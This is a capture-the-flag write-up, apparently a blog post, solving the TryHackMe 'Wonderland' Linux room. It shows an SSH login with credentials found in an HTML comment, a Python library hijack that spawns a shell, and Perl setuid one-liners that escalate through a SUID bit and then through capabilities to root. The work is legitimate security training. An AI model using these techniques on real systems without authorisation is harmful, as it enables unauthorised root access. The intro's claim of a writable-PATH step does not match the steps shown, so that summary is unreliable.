---
date: 2026-05-12
authors:
  - superxz3r0
categories:
  - TryHackMe
tags:
  - linux
  - privesc
  - python
  - suid
---

# Wonderland — TryHackMe

**Difficulty:** Medium &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Category:** General

Alice in Wonderland themed room. Getting a foothold involves abusing a Python path hijacking vulnerability, then chaining two privilege escalation techniques to reach root — one via a writable PATH and one SUID binary.

<!-- more -->

---

## Recon

```bash
nmap -sV -sC -oN nmap.txt 10.10.x.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Golang net/http server
```

Only two ports open. Went straight to the web server.

## Enumeration

### Web

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/img          (Status: 301)
/r            (Status: 301)
/r/a          (Status: 301)
/r/a/b        (Status: 301)
/r/a/b/b      (Status: 301)
/r/a/b/b/i    (Status: 301)
/r/a/b/b/i/t  (Status: 301)
```

!!! tip "Rabbit hole... literally"
    The path spells out `/r/a/b/b/i/t` — rabbit. Checking the page source at `/r/a/b/b/i/t` revealed hidden SSH credentials.

```html
<!-- alice:HowDothTheL1ttleCrocodile -->
```

## Foothold

```bash
ssh alice@10.10.x.x
```

We're in as `alice`. The root flag is sitting right in `/home/alice/`, but we can't read it — and the user flag is in `/root/`. Classic Wonderland twist.

```
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
```

## Privilege Escalation

### alice → rabbit (Python library hijacking)

```bash
sudo -l
```

```
User alice may run the following commands:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script imports the `random` module. Since we run it as `rabbit`, we can create a fake `random.py` in the same directory that spawns a shell:

```python
# /home/alice/random.py
import os
os.system("/bin/bash")
```

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Shell as `rabbit`.

### rabbit → hatter (SUID binary)

```bash
find / -perm -4000 2>/dev/null
```

```
/usr/bin/perl5.26.1
```

Perl has the SUID bit set and is owned by `hatter`. One-liner from GTFOBins:

```bash
perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(1003); exec "/bin/bash";'
```

Shell as `hatter`. Found the password in `/home/hatter/password.txt`.

### hatter → root (capabilities)

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl5.26.1 = cap_setuid+ep
```

Perl has `cap_setuid` — we can set our UID to 0:

```bash
perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Root shell.

## Flags

| Flag | Location |
|------|----------|
| User | `/root/user.txt` → `thm{Xx...}` |
| Root | `/home/alice/root.txt` → `thm{Xx...}` |

## Key Takeaways

- Always check page source — credentials are sometimes hidden in HTML comments
- Python scripts running with `sudo` are vulnerable to library hijacking if you can write to the script's directory
- `getcap -r /` is an underrated privesc check — capabilities can be as powerful as SUID
